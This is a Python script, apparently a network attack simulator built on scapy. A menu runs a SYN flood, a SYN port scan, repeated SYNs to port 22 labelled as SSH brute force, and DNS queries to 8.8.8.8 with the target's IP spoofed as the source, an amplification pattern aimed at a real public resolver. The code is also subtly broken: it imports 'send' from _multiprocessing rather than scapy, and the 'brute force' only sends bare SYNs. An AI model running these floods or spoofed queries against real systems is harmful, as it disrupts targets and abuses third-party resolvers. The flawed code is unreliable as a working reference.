import os
import sys

from _multiprocessing import send
from scapy.layers.inet import TCP,IP,UDP
from scapy.layers.dns import DNS,DNSQR
import time
import random
from threading import Thread

class AttackSimulator:
    def __init__(self, target_ip="192.168.1.100", attacker_ip="192.168.1.200"):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        
    def simulate_dos_attack(self, duration=10):
        """Simulate a DoS attack with SYN flood"""
        print(f"[*] Starting DoS (SYN Flood) attack simulation for {duration} seconds...")
        end_time = time.time() + duration
        
        while time.time() < end_time:
            sport = random.randint(1024, 65535)
            # SYN flood
            syn_packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                        TCP(sport=sport, dport=80, flags="S")
            send(syn_packet, verbose=False)
            time.sleep(0.1)  # Small delay to not overwhelm the system
            
    def simulate_port_scan(self, ports=None):
        """Simulate a port scanning attack"""
        if ports is None:
            ports = [20, 21, 22, 23, 25, 53, 80, 443, 445, 3389]
            
        print(f"[*] Starting Port Scan simulation on ports {ports}...")
        for port in ports:
            # TCP SYN scan
            syn_packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                        TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
            send(syn_packet, verbose=False)
            time.sleep(0.2)
            
    def simulate_bruteforce_ssh(self, duration=10):
        """Simulate SSH brute force attack"""
        print(f"[*] Starting SSH Brute Force simulation for {duration} seconds...")
        end_time = time.time() + duration
        
        while time.time() < end_time:
            # SSH connection attempts
            syn_packet = IP(src=self.attacker_ip, dst=self.target_ip) / \
                        TCP(sport=random.randint(1024, 65535), dport=22, flags="S")
            send(syn_packet, verbose=False)
            time.sleep(0.5)
            
    def simulate_dns_amplification(self, duration=10):
        """Simulate DNS amplification attack"""
        print(f"[*] Starting DNS Amplification simulation for {duration} seconds...")
        end_time = time.time() + duration
        
        while time.time() < end_time:
            # DNS query with spoofed source IP
            dns_packet = IP(src=self.target_ip, dst="8.8.8.8") / \
                        UDP(sport=random.randint(1024, 65535), dport=53) / \
                        DNS(rd=1, qd=DNSQR(qname="example.com"))
            send(dns_packet, verbose=False)
            time.sleep(0.2)

def main():
    # Create attack simulator instance
    simulator = AttackSimulator()
    
    try:
        while True:
            print("\nNetwork Attack Simulation Menu:")
            print("1. DoS Attack (SYN Flood)")
            print("2. Port Scan")
            print("3. SSH Brute Force")
            print("4. DNS Amplification")
            print("5. Run All Attacks")
            print("6. Exit")
            
            choice = input("\nSelect attack type (1-6): ")
            
            if choice == '1':
                simulator.simulate_dos_attack()
            elif choice == '2':
                simulator.simulate_port_scan()
            elif choice == '3':
                simulator.simulate_bruteforce_ssh()
            elif choice == '4':
                simulator.simulate_dns_amplification()
            elif choice == '5':
                # Run all attacks in sequence
                print("[*] Running all attack simulations...")
                simulator.simulate_dos_attack(duration=5)
                simulator.simulate_port_scan()
                simulator.simulate_bruteforce_ssh(duration=5)
                simulator.simulate_dns_amplification(duration=5)
                print("[+] All attack simulations completed")
            elif choice == '6':
                print("[+] Exiting...")
                break
            else:
                print("[!] Invalid choice. Please select 1-6")
                
    except KeyboardInterrupt:
        print("\n[!] Attack simulation stopped by user")
    except Exception as e:
        print(f"\n[!] Error during simulation: {str(e)}")

if __name__ == "__main__":
    # Require root/admin privileges warning
    if os.geteuid() != 0:
        print("[!] This script requires root/admin privileges to send raw packets")
        print("[!] Please run with sudo/administrator privileges")
        sys.exit(1)
        
    main()